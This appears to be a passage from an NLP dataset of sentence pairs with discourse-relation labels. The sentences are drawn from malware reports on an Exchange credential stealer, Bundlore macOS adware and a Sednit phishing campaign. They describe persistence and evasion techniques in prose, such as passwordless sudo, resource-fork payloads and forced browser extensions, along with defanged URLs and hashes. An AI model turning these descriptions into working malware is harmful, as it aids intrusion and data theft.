        "S2": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "relation": "MISC"
    },
    {
        "S1": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "S2": "The URL is encoded using Base64 and some char replacements.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The URL is encoded using Base64 and some char replacements.",
        "S2": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "relation": "MISC"
    },
    {
        "S1": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "S2": "The function loops endlessly and continues to execute the reconnaissance activity and send it to the attacker.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The function loops endlessly and continues to execute the reconnaissance activity and send it to the attacker.",
        "S2": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "S2": "At first glance, the module appears to solely be used to steal credentials, which can be seen in several classes and data arguments with clear names like \u201cCredential\u201d and \u201cCredentialType\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At first glance, the module appears to solely be used to steal credentials, which can be seen in several classes and data arguments with clear names like \u201cCredential\u201d and \u201cCredentialType\u201d.",
        "S2": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "S2": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "S2": "It inserts these credentials into the respective module variable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It inserts these credentials into the respective module variable.",
        "S2": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "S2": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "S2": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "S2": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.",
        "S2": "Extracting this sensitive data allows the attacker access to an inside domain user for the internal mail services of an enterprise along with access to the domain certificate of an enterprise.",
        "relation": "NEXT"
    },
    {
        "S1": "Extracting this sensitive data allows the attacker access to an inside domain user for the internal mail services of an enterprise along with access to the domain certificate of an enterprise.",
        "S2": "With systeminfo, the attacker can identify which user is a domain administrator.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With systeminfo, the attacker can identify which user is a domain administrator.",
        "S2": "This creates a very dangerous combination of sensitive data leakage and potentially large scale cyber spying or infostealing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This creates a very dangerous combination of sensitive data leakage and potentially large scale cyber spying or infostealing.",
        "S2": "It also shows that the intended target of this malware is first and foremost enterprises.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It also shows that the intended target of this malware is first and foremost enterprises.",
        "S2": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "relation": "MISC"
    },
    {
        "S1": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "S2": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "S2": "If so, it attempts to access the file \u201cAutodiscover.xml\u201d using the function GetFiles.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If so, it attempts to access the file \u201cAutodiscover.xml\u201d using the function GetFiles.",
        "S2": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "S2": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "S2": "It then attempts to collect the AutoDiscover SMTP address of the dedicated exchange forest, and eventually puts all the extracted data in a variable called \u201ctext\u201d .",
        "relation": "NEXT"
    },
    {
        "S1": "It then attempts to collect the AutoDiscover SMTP address of the dedicated exchange forest, and eventually puts all the extracted data in a variable called \u201ctext\u201d .",
        "S2": "After collecting the sensitive data, the module compresses it using Base64.",
        "relation": "NEXT"
    },
    {
        "S1": "After collecting the sensitive data, the module compresses it using Base64.",
        "S2": "This is a new feature of this specific module within the \u201cUtils\u201d class.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is a new feature of this specific module within the \u201cUtils\u201d class.",
        "S2": "Then, it sends the sensitive data to the attacker\u2019s C2 with the POST function and an embedded URI.",
        "relation": "MISC"
    },
    {
        "S1": "The mm-install->macos variant of the Bundlore family of macOS adware has been around for many years in many variations and delivery methods.",
        "S2": "Recently, a variant with a novel installation method was discovered.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Recently, a variant with a novel installation method was discovered.",
        "S2": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "S2": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "S2": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "relation": "ELABORATION"
    },
    {
        "S1": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "S2": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "S2": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "relation": "NEXT"
    },
    {
        "S1": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "S2": "The software downloaded has a multi-stage installer that, once given authentication from the user, gathers system information and ultimately installs multiple adware programs as root.",
        "relation": "NEXT"
    },
    {
        "S1": "The software downloaded has a multi-stage installer that, once given authentication from the user, gathers system information and ultimately installs multiple adware programs as root.",
        "S2": "The installed program demonstrates persistence on the system and the capability to silently download and install software as root at any time.",
        "relation": "NEXT"
    },
    {
        "S1": "The installed program demonstrates persistence on the system and the capability to silently download and install software as root at any time.",
        "S2": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "S2": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "S2": "Each extension download URL uses a unique GUID, and changing this GUID results in the download of a different sample by hash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each extension download URL uses a unique GUID, and changing this GUID results in the download of a different sample by hash.",
        "S2": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "relation": "NEXT"
    },
    {
        "S1": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "S2": "More details regarding this extension are covered in the Configuration Profiles section below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More details regarding this extension are covered in the Configuration Profiles section below.",
        "S2": "When the URL in the script above is visited, the user is redirected to another site (in this case, http://cshus[.]albertbucket[.]icu/) which at the time was offering a download for a fake Adobe Flash Update, which downloaded the file AdobeFlashPlayer.zip (SHA256: 98bbcced1edf5ee4d781664b8fe722262aefd1cc4e7aa22a271aa9720de56c15).",
        "relation": "MISC"
    },
    {
        "S1": "When the URL in the script above is visited, the user is redirected to another site (in this case, http://cshus[.]albertbucket[.]icu/) which at the time was offering a download for a fake Adobe Flash Update, which downloaded the file AdobeFlashPlayer.zip (SHA256: 98bbcced1edf5ee4d781664b8fe722262aefd1cc4e7aa22a271aa9720de56c15).",
        "S2": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d",
        "S2": "This zip file contained the disk image AdobeFlashPlayer.dmg (SHA256: f425e6b6ac74b2b3b2c8b20b56641dfa8bcdd325b3bcabe023970855cc7f129e) which was automatically mounted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This zip file contained the disk image AdobeFlashPlayer.dmg (SHA256: f425e6b6ac74b2b3b2c8b20b56641dfa8bcdd325b3bcabe023970855cc7f129e) which was automatically mounted.",
        "S2": "The mounted DMG does not contain an installer; instead it displays an image containing an alias to a script in the mounted volume:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The mounted DMG does not contain an installer; instead it displays an image containing an alias to a script in the mounted volume:",
        "S2": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "relation": "NEXT"
    },
    {
        "S1": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "S2": "Resource forks were introduced in the early days of the Macintosh File System (MFS) and are deprecated but are still available, even in macOS Catalina.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Resource forks were introduced in the early days of the Macintosh File System (MFS) and are deprecated but are still available, even in macOS Catalina.",
        "S2": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "S2": "Much like Alternative Data Streams (ADS) on Windows, the data is hidden from regular file and directory viewers, and multiple \u201cstreams\u201d or \u201cforks\u201d are allowed on an individual file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Much like Alternative Data Streams (ADS) on Windows, the data is hidden from regular file and directory viewers, and multiple \u201cstreams\u201d or \u201cforks\u201d are allowed on an individual file.",
        "S2": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "S2": "When ls is run with the \u2013l flag on a file that contains extended attributes, an \u201c@\u201d character will appear at the end of the file type and permissions listing:",
        "relation": "ELABORATION"
    },
    {
        "S1": "When ls is run with the \u2013l flag on a file that contains extended attributes, an \u201c@\u201d character will appear at the end of the file type and permissions listing:",
        "S2": "This indicates that the Install.command file has extended attributes, but does not tell us what kind of attributes they are.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This indicates that the Install.command file has extended attributes, but does not tell us what kind of attributes they are.",
        "S2": "If we run ls \u2013l@ however, we can see the listed attributes and their sizes, including the ResourceFork:",
        "relation": "ELABORATION"
    },
    {
        "S1": "If we run ls \u2013l@ however, we can see the listed attributes and their sizes, including the ResourceFork:",
        "S2": "We can also use the tool xattr -p to view the contents of the ResourceFork, which in this case is output in hexadecimal (I have used the system command tail below in order to truncate the results \u2013 this shows only the end of the resource contents):",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can also use the tool xattr -p to view the contents of the ResourceFork, which in this case is output in hexadecimal (I have used the system command tail below in order to truncate the results \u2013 this shows only the end of the resource contents):",
        "S2": "The script from the analyzed sample is shown below.",
        "relation": "MISC"
    },
    {
        "S1": "The script from the analyzed sample is shown below.",
        "S2": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "S2": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "S2": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "relation": "NEXT"
    },
    {
        "S1": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "S2": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:",
        "relation": "NEXT"
    },
    {
        "S1": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:",
        "S2": "Ironically, some of the URL redirects resulting from the browser injection ultimately route through the site mackeeperaffiliates[.]com to the actual MacKeeper download page, the company who wrote up a blog post on this adware last year.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Ironically, some of the URL redirects resulting from the browser injection ultimately route through the site mackeeperaffiliates[.]com to the actual MacKeeper download page, the company who wrote up a blog post on this adware last year.",
        "S2": "The process tree for the installation of this initial script from VMware Carbon Black Cloud Enterprise EDR showing the myriad system noise created by this activity is shown below.",
        "relation": "MISC"
    },
    {
        "S1": "The process tree for the installation of this initial script from VMware Carbon Black Cloud Enterprise EDR showing the myriad system noise created by this activity is shown below.",
        "S2": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "relation": "MISC"
    },
    {
        "S1": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "S2": "A few of the applications observed to be installed by this variant are as follows:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A few of the applications observed to be installed by this variant are as follows:",
        "S2": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "S2": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "S2": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:",
        "relation": "NEXT"
    },
    {
        "S1": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:",
        "S2": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:",
        "relation": "MISC"
    },
    {
        "S1": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:",
        "S2": "- Checks the user account to see if it is either root or has sudo (root) privileges",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Checks the user account to see if it is either root or has sudo (root) privileges",
        "S2": "- Checks the domain request[.]pingtrusteer[.]com for any updates to the software",
        "relation": "LIST"
    },
    {
        "S1": "- Checks the domain request[.]pingtrusteer[.]com for any updates to the software",
        "S2": "- Creates MD5 hash of the system\u2019s serial number to use as a unique ID",
        "relation": "LIST"
    },
    {
        "S1": "- Creates MD5 hash of the system\u2019s serial number to use as a unique ID",
        "S2": "- Pulls the versions of the OS and installed web browsers",
        "relation": "LIST"
    },
    {
        "S1": "- Pulls the versions of the OS and installed web browsers",
        "S2": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)",
        "relation": "LIST"
    },
    {
        "S1": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)",
        "S2": "- Modifies the sudoers file to grant passwordless execution for the specified programs (PingTrusteer in this case, as seen above)",
        "relation": "LIST"
    },
    {
        "S1": "- Modifies the sudoers file to grant passwordless execution for the specified programs (PingTrusteer in this case, as seen above)",
        "S2": "- Compiles lists of all installed applications, profiles, LaunchAgents, and LaunchDaemons",
        "relation": "LIST"
    },
    {
        "S1": "- Compiles lists of all installed applications, profiles, LaunchAgents, and LaunchDaemons",
        "S2": "- Checks version of the macOS Malware Removal Tool (MRT)",
        "relation": "LIST"
    },
    {
        "S1": "- Checks version of the macOS Malware Removal Tool (MRT)",
        "S2": "- Posts system-specific json data to the server mmp[.]myshopcouponmac[.]com",
        "relation": "LIST"
    },
    {
        "S1": "- Posts system-specific json data to the server mmp[.]myshopcouponmac[.]com",
        "S2": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "relation": "MISC"
    },
    {
        "S1": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "S2": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz",
        "relation": "MISC"
    },
    {
        "S1": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz",
        "S2": "SearchMine Browser search tool profile.mobileconfig SearchMine Configuration Profile install-nwt.bin iwt.bin Webtools Installer",
        "relation": "MISC"
    },
    {
        "S1": "SearchMine Browser search tool profile.mobileconfig SearchMine Configuration Profile install-nwt.bin iwt.bin Webtools Installer",
        "S2": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "relation": "MISC"
    },
    {
        "S1": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "S2": "Configuration profiles are typically used in enterprise, educational, or other distributed environments requiring centralized management and deployment of customized system configurations.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Configuration profiles are typically used in enterprise, educational, or other distributed environments requiring centralized management and deployment of customized system configurations.",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "S2": "Because it installs these profiles from the command line with root privileges, the user is never notified.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Because it installs these profiles from the command line with root privileges, the user is never notified.",
        "S2": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "S2": "This post from MalwareBytes details a related malware sample called Crossrider that installs a similar profile, as well as how to list and remove any malicious profiles installed.",
        "relation": "MISC"
    },
    {
        "S1": "This post from MalwareBytes details a related malware sample called Crossrider that installs a similar profile, as well as how to list and remove any malicious profiles installed.",
        "S2": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "S2": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.",
        "S2": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "S2": "This script is configured to install different products depending on what is retrieved from the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script is configured to install different products depending on what is retrieved from the server.",
        "S2": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "S2": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "relation": "MISC"
    },
    {
        "S1": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "S2": "In red, the base URL parameters are shown, along with the search domain that the browser will be configured to use.",
        "relation": "MISC"
    },
    {
        "S1": "In red, the base URL parameters are shown, along with the search domain that the browser will be configured to use.",
        "S2": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.",
        "S2": "Once a profile is successfully installed, there will be a new icon in the System Preferences dialog as seen below:",
        "relation": "NEXT"
    },
    {
        "S1": "Once a profile is successfully installed, there will be a new icon in the System Preferences dialog as seen below:",
        "S2": "The profiles installed depend on the browsers installed on the system, and which browser is set to default.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The profiles installed depend on the browsers installed on the system, and which browser is set to default.",
        "S2": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "S2": "As mentioned before and described in more detail below, it also installs the MyCouponsmart extension via means that render the user unable to remove it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned before and described in more detail below, it also installs the MyCouponsmart extension via means that render the user unable to remove it.",
        "S2": "This profile configuration information is stored in plists on the system after loading.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This profile configuration information is stored in plists on the system after loading.",
        "S2": "These per-user profile plists are located under a user directory under /Library/ManagedPreferences/<user>/ and define browser defaults such as the default search and home page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These per-user profile plists are located under a user directory under /Library/ManagedPreferences/<user>/ and define browser defaults such as the default search and home page.",
        "S2": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "S2": "This is accomplished by using the Chrome ExtensionInstallForceList key which is provided for managed enterprise computers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is accomplished by using the Chrome ExtensionInstallForceList key which is provided for managed enterprise computers.",
        "S2": "According to Chrome documentation:",
        "relation": "ELABORATION"
    },
    {
        "S1": "According to Chrome documentation:",
        "S2": "[ExtensionInstallForceList] Specifies a list of apps and extensions that are installed silently, without user interaction, and which cannot be uninstalled nor disabled by the user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "[ExtensionInstallForceList] Specifies a list of apps and extensions that are installed silently, without user interaction, and which cannot be uninstalled nor disabled by the user.",
        "S2": "All permissions requested by the apps/extensions are granted implicitly, without user interaction, including any additional permissions requested by future versions of the app/extension.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All permissions requested by the apps/extensions are granted implicitly, without user interaction, including any additional permissions requested by future versions of the app/extension.",
        "S2": "This can be seen in the script below as highlighted in red, where the extension ID is lfbenaabfliihodeianphjhhhcjgddlh and points to the URL http://download[.]shoptimizelymac[.]com for updates:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be seen in the script below as highlighted in red, where the extension ID is lfbenaabfliihodeianphjhhhcjgddlh and points to the URL http://download[.]shoptimizelymac[.]com for updates:",
        "S2": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:",
        "S2": "Installed policy information seen in the plist above can also be viewed in the Chrome policy page:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Installed policy information seen in the plist above can also be viewed in the Chrome policy page:",
        "S2": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "S2": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "relation": "NEXT"
    },
    {
        "S1": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).",
        "S2": "Furthermore, unlike other adware families like Smokyashan, these additional components are not installed in the usual Applications folder, but instead are installed into the user\u2019s Application directory located in /Users/<user>/Applications.",
        "relation": "NEXT"
    },
    {
        "S1": "Furthermore, unlike other adware families like Smokyashan, these additional components are not installed in the usual Applications folder, but instead are installed into the user\u2019s Application directory located in /Users/<user>/Applications.",
        "S2": "This folder is not readily visible to the user unless they navigate directly to the directory in Finder.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This folder is not readily visible to the user unless they navigate directly to the directory in Finder.",
        "S2": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "relation": "MISC"
    },
    {
        "S1": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "S2": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "S2": "Although the only programs observed to be installed by Bundlore thus far have been adware, with root access and no additional authentication required from the user, any software could be installed with full access to the file system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although the only programs observed to be installed by Bundlore thus far have been adware, with root access and no additional authentication required from the user, any software could be installed with full access to the file system.",
        "S2": "Existing customers can learn more about how VMware Carbon Black products protect against this variant of Bundlore by visiting our \u201cBundlore (macOS) mm-install-macos\u201d TAU-TIN hosted on the User Exchange.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components.",
        "S2": "In the past, Sednit used a similar technique for credential phishing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the past, Sednit used a similar technique for credential phishing.",
        "S2": "However, it is unusual for the group to use this technique to deliver one of its malware components directly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, it is unusual for the group to use this technique to deliver one of its malware components directly.",
        "S2": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "S2": "The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.",
        "S2": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "relation": "ELABORATION"
    },
    {
        "S1": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "S2": "Let\u2019s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the URL twice, or maybe even more times, because the outcome was not what they expected\u2026 as we will describe below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Let\u2019s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the URL twice, or maybe even more times, because the outcome was not what they expected\u2026 as we will describe below.",
        "S2": "While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don\u2019t have a sample of such an email.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don\u2019t have a sample of such an email.",
        "S2": "The shortened URL leads the victim to an IP-address-based URL, where the archived payload is located.",
        "relation": "NEXT"
    },
    {
